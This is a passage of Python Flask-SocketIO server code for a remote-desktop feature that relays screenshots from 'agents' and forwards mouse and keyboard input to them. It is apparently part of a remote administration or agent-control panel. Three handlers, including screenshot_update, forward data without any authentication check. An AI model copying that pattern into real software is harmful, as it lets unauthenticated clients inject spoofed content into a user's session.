                print(f"[SocketIO] Current remote_desktop_active_agents after disconnect: {list(remote_desktop_active_agents.keys())}")

                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET rd_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()

                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

                emit('rd_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'Remote Desktop disconnected'
                }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

                # Tell the agent to stop sending screenshots
                emit('stop_screenshots', {
                    'agent_id': agent_id
                }, room=f"agent_{agent_id}", namespace='/remote_desktop')
        print(f"[SocketIO] Remote Desktop client disconnected. Total connections: {connection_count}")

    @socketio.on('screenshot_update', namespace='/remote_desktop')
    def handle_screenshot_update(data):
        agent_id = data.get('agent_id')
        screenshot = data.get('screenshot')
        if not agent_id or not screenshot:
            print("[SocketIO] screenshot_update event missing agent_id or screenshot")
            return
        # Allow screenshot updates from any agent that is connected to remote_desktop namespace
        # The agent should have been authenticated when it connected
        # Forward the screenshot to the remote desktop UI room
        emit('screenshot_update', data, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

    @socketio.on('change_quality', namespace='/remote_desktop')
    def handle_change_quality(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            quality = data.get('quality')
            if not agent_id or quality not in ['low', 'medium', 'high']:
                print("[SocketIO] change_quality event missing agent_id or invalid quality")
                return
            print(f"[SocketIO] Forwarding quality change to agent {agent_id}: {quality}")
            # Forward the quality change to the agent's room
            emit('change_quality', {
                'quality': quality,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('mouse_move', namespace='/remote_desktop')
    def handle_mouse_move(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            x = data.get('x')
            y = data.get('y')
            if not agent_id or x is None or y is None:
                print("[SocketIO] mouse_move event missing agent_id, x, or y")
                return
            emit('mouse_move', {
                'x': x,
                'y': y,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('mouse_click', namespace='/remote_desktop')
    def handle_mouse_click(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            x = data.get('x')
            y = data.get('y')
            button = data.get('button', 'left')
            if not agent_id or x is None or y is None:
                print("[SocketIO] mouse_click event missing agent_id, x, or y")
                return
            emit('mouse_click', {
                'x': x,
                'y': y,
                'button': button,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('mouse_scroll', namespace='/remote_desktop')
    def handle_mouse_scroll(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            x = data.get('x')
            y = data.get('y')
            direction = data.get('direction', 'down')
            if not agent_id or x is None or y is None:
                print("[SocketIO] mouse_scroll event missing agent_id, x, or y")
                return
            emit('mouse_scroll', {
                'x': x,
                'y': y,
                'direction': direction,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('keyboard_press', namespace='/remote_desktop')
    def handle_keyboard_press(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            key = data.get('key')
            keyCode = data.get('keyCode')
            shiftKey = data.get('shiftKey', False)
            ctrlKey = data.get('ctrlKey', False)
            altKey = data.get('altKey', False)
            if not agent_id or not key:
                print("[SocketIO] keyboard_press event missing agent_id or key")
                return
            print(f"[SocketIO] Forwarding keyboard press to agent {agent_id}: {key} (code: {keyCode})")
            emit('keyboard_press', {
                'key': key,
                'keyCode': keyCode,
                'shiftKey': shiftKey,
                'ctrlKey': ctrlKey,
                'altKey': altKey,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('keyboard_release', namespace='/remote_desktop')
    def handle_keyboard_release(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            key = data.get('key')
            keyCode = data.get('keyCode')
            if not agent_id or not key:
                print("[SocketIO] keyboard_release event missing agent_id or key")
                return
            print(f"[SocketIO] Forwarding keyboard release to agent {agent_id}: {key} (code: {keyCode})")
            emit('keyboard_release', {
                'key': key,
                'keyCode': keyCode,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    # Add screen info and scale factors handlers
    @socketio.on('screen_info', namespace='/remote_desktop')
    def handle_screen_info(data):
        # Forward from agent to UI, so no current_user.is_authenticated check
        agent_id = data.get('agent_id')
        if not agent_id:
            print("[SocketIO] screen_info event missing agent_id")
            return
        print(f"[SocketIO] Forwarding screen info from agent {agent_id}")
        emit('screen_info', data, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

    @socketio.on('scale_factors', namespace='/remote_desktop')
    def handle_scale_factors(data):
        # Forward from agent to UI, so no current_user.is_authenticated check
        agent_id = data.get('agent_id')
        if not agent_id:
            print("[SocketIO] scale_factors event missing agent_id")
            return
        print(f"[SocketIO] Forwarding scale factors from agent {agent_id}")
        emit('scale_factors', data, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')